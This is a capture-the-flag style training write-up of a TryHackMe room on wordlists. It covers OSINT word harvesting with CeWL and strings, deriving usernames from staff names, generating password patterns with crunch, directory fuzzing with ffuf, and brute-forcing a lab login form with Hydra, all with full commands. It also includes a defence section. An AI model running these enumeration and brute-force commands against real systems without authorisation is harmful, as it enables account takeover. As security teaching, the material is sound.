# Introduction to Wordlists

A **wordlist** is just a text file with one candidate per line — usernames, passwords, directory names, subdomains. Tools feed each line into a login form, a hash cracker, or a web server so a machine does the guessing instead of a human. This room is about **building a *targeted* list from OSINT** (words that actually relate to your target) rather than throwing a generic 14-million-line dump at everything.

> This is the **TryHackMe "Introduction to Wordlists" room** (Jr. Penetration Tester → Password Attacks, room 3). One target site, **TryFinanceMe**, taken end to end: scrape it for words → clean the lists → use them with **ffuf** to find a hidden directory and **Hydra** to brute-force the login form behind it.
>
> 🔗 Same module: **Hydra** (the login brute-forcer used here, in depth) and **Password Cracking** (offline hash cracking with John/Hashcat). The `ffuf` directory/brute-force workflow also appears in [Broken Authentication](../Web-Application-Vulnerabilities-II/Broken-Authentication.md).

---

**Table of contents**

- [In plain English](#in-plain-english)
- [What a wordlist is and where it's used](#what-a-wordlist-is-and-where-its-used)
- [Where wordlists come from](#where-wordlists-come-from)
- [Gathering words with OSINT (Task 3)](#gathering-words-with-osint-task-3)
  - [CeWL — spider the site for words](#cewl--spider-the-site-for-words)
  - [Documents → strings → words](#documents--strings--words)
  - [Emails and names → usernames](#emails-and-names--usernames)
- [Cleaning the lists (Task 4)](#cleaning-the-lists-task-4)
- [Pattern-based passwords with crunch](#pattern-based-passwords-with-crunch)
- [Using the lists: ffuf + Hydra (Task 5)](#using-the-lists-ffuf--hydra-task-5)
- [Defence: why this works and how to stop it](#defence-why-this-works-and-how-to-stop-it)
- [Key takeaways](#key-takeaways)

---

## In plain English

You're a burglar who could try every key ever made (a huge generic list, slow), **or** you could learn that the owner is a football fan named Alex born in '88 and try `Arsenal88!` first (a small targeted list, fast). This room is about doing the homework so your guesses are the *likely* ones.

The workflow is always the same three moves:

1. **Harvest** — scrape the target for real words: site text, PDFs, employee names, emails.
2. **Clean** — merge everything, drop duplicates, make it all lowercase, throw out junk.
3. **Use** — point the clean list at a tool: `ffuf` for hidden pages, `Hydra` for the login form.

**New terms, no jargon:**

- **OSINT** — Open-Source INTelligence: info you gather from public places (the website, LinkedIn, job ads, WHOIS). No hacking, just reading.
- **Enumeration** — systematically listing what exists (e.g. every directory on a server) by trying candidates and seeing which ones respond.
- **Brute-force vs dictionary** — brute-force tries *every* combination; a dictionary attack tries a *list* of likely ones. A wordlist is what makes it a dictionary attack.
- **Fuzzing** — throwing many inputs at one spot to see what sticks; `ffuf` = "Fuzz Faster U Fool", a fuzzer.
- **Spider / crawl** — a tool that follows links across a site automatically, collecting pages (and here, words).
- **Normalise** — force everything into one consistent shape (all lowercase, no stray characters) so `Helios`, `helios`, `HELIOS` count as one word.

---

## What a wordlist is and where it's used

One line = one guess. The same file format serves completely different attacks depending on the tool you hand it to:

| Attack | What the list contains | Example tool |
| --- | --- | --- |
| **Password cracking** (offline) | Common/leaked passwords, dictionary words | John the Ripper, Hashcat |
| **Login brute-forcing** (online) | Usernames + passwords tried against a live service | Hydra, Medusa |
| **Directory / file discovery** | Folder and file names to probe on a web server | Gobuster, ffuf, DirBuster |
| **Subdomain discovery** | Candidate hostnames (`dev`, `mail`, `vpn`…) | ffuf, Sublist3r, DNSRecon |
| **Web fuzzing** | Parameter/cookie/header names to test | Burp Suite, OWASP ZAP |
| **Wireless cracking** | Candidate WPA/WPA2 passphrases | Aircrack-ng |

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Offline vs online guessing.</strong> <em>Offline</em> cracking (John/Hashcat) works on a stolen hash on your own machine — millions of guesses per second, no one watching. <em>Online</em> brute-forcing (Hydra) sends real requests to a live service — far slower and noisy, so a small, smart list matters a lot more. This room does the online kind.
</div>

## Where wordlists come from

**Pre-made lists** (breadth, come bundled with Kali):

| List | Where | Size / use |
| --- | --- | --- |
| `rockyou.txt` | `/usr/share/wordlists/rockyou.txt` | **14,344,392** real leaked passwords — the default password list |
| **SecLists** | GitHub / `/usr/share/seclists` | A whole *collection*: usernames, passwords, dir names, DNS, payloads |
| `raft-large-files.txt`, `common.txt` | SecLists → web content | Directory/file discovery |
| `subdomains-top1million-5000.txt` | SecLists → DNS | Fast subdomain scanning |
| `top-passwords-shortlist.txt` | SecLists → passwords | Small, high-hit password list |

**Custom lists** (relevance) — built from the target's own words: personal info, local language, industry terms, product names. Less noise, higher hit rate. *This is the room's whole point.*

**Generators** (exhaustive) — when you know the *shape* of a password but not the value, `crunch` produces every string matching a pattern:

```bash
crunch 6 6 0123456789abcdef -o 6chars.txt   # every 6-char hex string
```

<div style="background:#fff7ed;border-left:4px solid #f59e0b;padding:12px;border-radius:6px;margin:8px 0">
<strong>Generators explode fast.</strong> Every extra character multiplies the file size. Use <code>crunch</code> only when you've narrowed the pattern (a known prefix + a couple of unknown digits). A targeted OSINT list beats a giant combinatorial dump almost every time.
</div>

## Gathering words with OSINT (Task 3)

A good custom list mixes three ingredients: **company-specific** terms (products, project names), **technology-specific** terms (framework/CMS paths), and **generic** routes (`api`, `admin`, `login`, `dev`). You get the first two by reading the target.

**Lab setup** — map the target's hostnames so they resolve:

```bash
echo 'MACHINE_IP tryfinanceme.local social.tryfinanceme.local' >> /etc/hosts
```

**OSINT sources worth mining** (no tools needed): LinkedIn/job ads (names, roles, tech stack → MITRE ATT&CK **T1591.004**), the company site and social media (project names, slogans, acronyms), WHOIS (`whois domain.com` → registrant, nameservers, IT contacts), certificate transparency logs (`crt.sh`) and passive DNS for historical subdomains.

### CeWL — spider the site for words

**CeWL** (Custom Word List generator) is a Ruby tool that crawls a site and pulls out every unique word — perfect for company-specific terms.

```bash
cewl -d 2 -m 3 --lowercase --with-numbers -e --email_file emails.txt \
     -w cewl_words.txt http://tryfinanceme.local
```

| Flag | Meaning |
| --- | --- |
| `-d 2` | Spider **2 levels** deep |
| `-m 3` | Keep words of **≥3 characters** |
| `--lowercase` | Lowercase everything |
| `--with-numbers` | Keep words containing digits |
| `-e` / `--email_file emails.txt` | Also extract emails → save to `emails.txt` |
| `-w cewl_words.txt` | Save the words here |

Output: `cewl_words.txt` (keywords) + `emails.txt` (company emails).

### Documents → strings → words

Organisations publish PDFs full of internal jargon (and occasionally credentials). Download them, then pull human-readable text out:

```bash
# grab every PDF under /docs recursively
wget -r -A pdf http://tryfinanceme.local/docs/

# extract printable strings (≥5 chars), dropping PDF structural junk
for f in $(find tryfinanceme.local/docs -name '*.pdf'); do
  strings -n 5 "$f" | grep -vP '^[/<>%0-9\\]|^(stream|endstream|endobj|xref|trailer|startxref)$' >> raw_words.txt
done
```

`strings` prints readable text from a binary file; the `grep -v` filters out PDF plumbing (`stream`, `xref`, etc.) so you keep real words.

### Emails and names → usernames

Pull emails out of the PDFs and strip them down to usernames:

```bash
grep -RhiaoP '[A-Za-z0-9._%+-]+@tryfinanceme\.com' tryfinanceme.local/docs > emails_docs.txt
sort -u emails_docs.txt > emails_docs.unique.txt
grep -Po '^[^@]+' emails_docs.unique.txt > users_from_emails.txt   # keep the part before @
```

Harvest real names from the social page (each is in `<h3 class="profile-name">Alex Johnson</h3>`):

```bash
curl -s http://social.tryfinanceme.local/ \
  | grep -Po '(?<=<h3 class="profile-name">)[^<]+' > names.txt
```

That regex uses a **positive lookbehind** `(?<=...)` — match right *after* the opening tag, then grab everything up to the `<`. Clean list of names, no surrounding HTML.

Turn names into the three username formats orgs actually use:

```bash
awk '{print tolower($1)"."tolower($2)}'          names.txt > users_first.last.txt  # alex.johnson
awk '{print tolower(substr($1,1,1))tolower($2)}' names.txt > users_flast.txt       # ajohnson
awk '{print tolower($1)tolower(substr($2,1,1))}' names.txt > users_firstl.txt      # alexj
```

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Why three formats?</strong> You don't know the org's convention, so you generate all the common ones (<code>first.last</code>, <code>flast</code>, <code>firstl</code>) and let Hydra find the one that logs in. Lowercasing avoids case mismatches.
</div>

**Files gathered so far:** `cewl_words.txt`, `emails.txt`, `raw_words.txt`, `emails_docs.txt`, `names.txt`, `users_first.last.txt`, `users_flast.txt`, `users_firstl.txt`, `users_from_emails.txt`.

## Cleaning the lists (Task 4)

Raw lists are messy: duplicates, mixed case, punctuation junk, Windows carriage returns. A bloated list wastes time and adds no hits, so clean before you use.

**Merge the word sources, then normalise + filter:**

```bash
cat cewl_words.txt raw_words.txt | sort -u > words_raw.txt

cat words_raw.txt \
  | tr '[:upper:]' '[:lower:]' \
  | tr -d '\r' \
  | grep -P '^[a-z0-9][a-z0-9._-]{4,}$' \
  | sort -u > words_clean.txt
```

| Step | Does |
| --- | --- |
| `sort -u` | Sort + drop duplicates |
| `tr '[:upper:]' '[:lower:]'` | Everything lowercase |
| `tr -d '\r'` | Strip Windows carriage returns |
| `grep -P '^[a-z0-9][a-z0-9._-]{4,}$'` | Start alphanumeric, only `a-z0-9._-` after, **≥5 chars** — kills noise |

Sanity-check size and contents:

```bash
wc -l words_clean.txt   # expect a few hundred lines
head words_clean.txt
```

**Merge the username lists** the same way:

```bash
cat users_first.last.txt users_flast.txt users_firstl.txt users_from_emails.txt | sort -u > users.txt
```

<div style="background:#fff7ed;border-left:4px solid #f59e0b;padding:12px;border-radius:6px;margin:8px 0">
<strong>Right-size the list.</strong> Too big → <code>ffuf</code>/Hydra crawl and you get drowned in false positives. Too small → you miss real paths. A few hundred clean, target-specific words is the sweet spot for this kind of enumeration.
</div>

## Pattern-based passwords with crunch

OSINT revealed the password *shape*: `Helios20NN!` where `NN` are two digits. Instead of guessing blindly, generate exactly that space (100 candidates):

```bash
crunch 11 11 -t Helios20%%! -o pass_helios.txt
```

- `11 11` — min and max length both 11.
- `-t Helios20%%!` — template; each `%` becomes a digit `0–9`, so `%%` = `00`–`99`.
- `-o pass_helios.txt` — writes 100 lines.

Tiny list → Hydra finishes in seconds. If the real pattern differs (different year, more digits), adjust the template.

**Ready to attack with:** `words_clean.txt` (directories), `users.txt` + `pass_helios.txt` (login).

## Using the lists: ffuf + Hydra (Task 5)

### Find the hidden directory with ffuf

Directory enumeration asks: *what exists on the server that isn't linked anywhere?* `ffuf` appends each word to the URL and reads the HTTP status code to decide if it's real.

```bash
ffuf -w words_clean.txt -u http://tryfinanceme.local/FUZZ -e .php,.html,/ -mc 200,301,302
```

| Flag | Meaning |
| --- | --- |
| `-w words_clean.txt` | The wordlist |
| `-u .../FUZZ` | `FUZZ` is replaced by each word |
| `-e .php,.html,/` | Also try each word with these extensions appended |
| `-mc 200,301,302` | Only show these status codes (real pages / redirects) |

We use our **custom** `words_clean.txt` (not a generic list) because the hidden dir is a *company* term we scraped. The result here is a directory: **`helios/`**.

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Drowning in false positives?</strong> Note the size/line-count of a typical 404, then filter it out: <code>-fs &lt;bytes&gt;</code> (filter by response size) or <code>-fl &lt;lines&gt;</code> (filter by line count). ffuf can also fuzz subdomains, parameters and API endpoints — same idea, different URL slot.
</div>

### Brute-force the login form with Hydra

The hidden dir has a login at `/helios/login.php`. Hydra's `http-post-form` module sends POST logins and tries every user×password combo:

```bash
hydra -L users.txt -P pass_helios.txt -f -V -t 4 tryfinanceme.local \
  http-post-form '/helios/login.php:username=^USER^&password=^PASS^:S=THM{'
```

The module argument is **three colon-separated parts**:

1. `/helios/login.php` — the form's path.
2. `username=^USER^&password=^PASS^` — the POST body; Hydra swaps in `^USER^` / `^PASS^` from the lists.
3. `S=THM{` — **success condition**: a login counts if the response contains `THM{` (lab-specific — the flag shows on success). You can also use `F=<text>` to match a *failure* string instead.

| Flag | Meaning |
| --- | --- |
| `-L users.txt` | Username list |
| `-P pass_helios.txt` | Password list |
| `-f` | Stop after the first valid credential |
| `-V` | Print every attempt |
| `-t 4` | 4 parallel threads (raise cautiously — too many can lock accounts or trip defences) |

When Hydra prints the valid `login: … password: …`, log in at `http://tryfinanceme.local/helios/` to reveal the flag.

<div style="background:#fff7ed;border-left:4px solid #f59e0b;padding:12px;border-radius:6px;margin:8px 0">
<strong>Get the success/failure condition right.</strong> The whole attack hinges on part 3. Pick a string that reliably appears <em>only</em> on success (<code>S=</code>) or <em>only</em> on failure (<code>F=</code>). Match the wrong string and Hydra reports every attempt as a win — or none.
</div>

## Defence: why this works and how to stop it

The attack only lands because of three weaknesses — each has a fix:

| What enabled the attack | Defence |
| --- | --- |
| Company words + names scraped freely (site, PDFs, social) | Minimise public exposure; scrub metadata/emails from published docs; monitor for scraping |
| Predictable password pattern (`Helios20NN!`) | Ban predictable/company-derived passwords; enforce length + a breach-password check (e.g. HIBP) |
| Login form accepts unlimited guesses | **Rate-limit and lock out** after N failures; add MFA; alert on burst failures |
| Predictable usernames (`first.last`) | Usernames aren't secrets — don't rely on them; the control that matters is throttling + MFA |

## Key takeaways

- A wordlist is one guess per line; the **tool** decides the attack (crack / brute-force / enumerate).
- **Targeted beats generic**: OSINT-built lists have far higher hit rates and less noise than dumping `rockyou.txt` at everything.
- Pipeline is always **harvest → clean → use**. Cleaning (dedupe, lowercase, filter) is what makes the list fast and effective.
- **CeWL** scrapes site words, **strings** mines documents, **awk** turns names into username formats, **crunch** exhausts a known pattern.
- **ffuf** finds hidden paths by status code; **Hydra** brute-forces the login using your `users.txt` + `pass_helios.txt` and a correct success/failure condition.
- Only ever run this against systems you're **authorised** to test.
